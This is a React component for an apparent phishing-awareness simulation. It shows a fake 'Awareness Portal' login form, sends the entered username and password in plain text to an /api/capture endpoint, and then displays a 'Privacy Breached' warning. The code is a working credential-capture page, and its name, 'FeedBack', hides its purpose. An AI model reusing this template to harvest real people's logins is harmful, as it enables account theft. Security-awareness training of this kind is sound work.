import React, { useState } from "react";
import '../Styling/login.css';

function FeedBack() {
    const [breached, setBreached] = useState(false);
    const [username, setUsername] = useState("");
    const [password, setPassword] = useState("");


    const handleSubmit = async (e) => {
        e.preventDefault();
        // Simulate credential capture
        setBreached(true);
        await fetch(`${import.meta.env.VITE_API_URL}/api/capture`, {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
            },
            body: JSON.stringify({ username, password }),
        });
    };



    return breached ? (
        <main
            className="d-flex align-items-center justify-content-center min-vh-100"
            style={{
                background: "linear-gradient(135deg, #1a1a1a, #3d0000)",
            }}
        >
            <div className="container">
                <div
                    className="card border-0 shadow-lg mx-auto text-center login-card-enter"
                    style={{
                        maxWidth: "500px",
                        borderRadius: "20px",
                        overflow: "hidden",
                    }}
                >
                    <div
                        className="card-body p-5"
                        style={{
                            background: "#b71c1c",
                            color: "#fff",
                        }}
                    >
                        <div className="mb-4" style={{ fontSize: "70px" }}>
                            ⚠️
                        </div>

                        <h1 className="fw-bold mb-3">
                            Privacy Breached
                        </h1>

                        <p className="lead mb-4">
                            Your credentials were captured during this
                            phishing awareness simulation.
                        </p>

                        <div
                            className="p-3 rounded"
                            style={{
                                background: "rgba(255,255,255,0.1)",
                            }}
                        >
                            <strong>
                                Never enter credentials on suspicious links or websites.
                            </strong>
                        </div>
                    </div>
                </div>
            </div>
        </main>
    ) : (
        <main
            className="d-flex align-items-center justify-content-center min-vh-100"
            style={{
                background:
                    "linear-gradient(135deg, #0f172a, #1e293b)",
            }}
        >
            <div className="container">
                <div
                    className="card border-0 shadow-lg mx-auto login-card-enter"
                    style={{
                        maxWidth: "420px",
                        borderRadius: "20px",
                        overflow: "hidden",
                    }}
                >
                    <div className="card-body p-5">
                        <div className="text-center mb-4">
                            <div
                                className="mx-auto mb-3 d-flex align-items-center justify-content-center"
                                style={{
                                    width: "70px",
                                    height: "70px",
                                    borderRadius: "50%",
                                    background: "#0d6efd",
                                    color: "#fff",
                                    fontSize: "30px",
                                }}
                            >
                                🔐
                            </div>

                            <h2 className="fw-bold">
                                Awareness Portal
                            </h2>

                            <p className="text-muted">
                                Sign in to continue
                            </p>
                        </div>

                        <form onSubmit={handleSubmit}>
                            <div className="mb-3">
                                <label
                                    htmlFor="fake-username"
                                    className="form-label fw-semibold"
                                >
                                    Username
                                </label>

                                <input
                                    type="text"
                                    className="form-control form-control-lg"
                                    id="fake-username"
                                    placeholder="Enter username"
                                    value={username}
                                    onChange={(e) =>
                                        setUsername(e.target.value)
                                    }
                                    required
                                />
                            </div>

                            <div className="mb-4">
                                <label
                                    htmlFor="fake-password"
                                    className="form-label fw-semibold"
                                >
                                    Password
                                </label>

                                <input
                                    type="password"
                                    className="form-control form-control-lg"
                                    id="fake-password"
                                    placeholder="Enter password"
                                    value={password}
                                    onChange={(e) =>
                                        setPassword(e.target.value)
                                    }
                                    required
                                />
                            </div>

                            <button
                                type="submit"
                                className="btn btn-primary btn-lg w-100"
                            >
                                Login
                            </button>
                        </form>

                        <div className="text-center mt-4">
                            <small className="text-muted">
                                Protected by Awareness Security
                            </small>
                        </div>
                    </div>
                </div>
            </div>
        </main>
    );
}

export default FeedBack;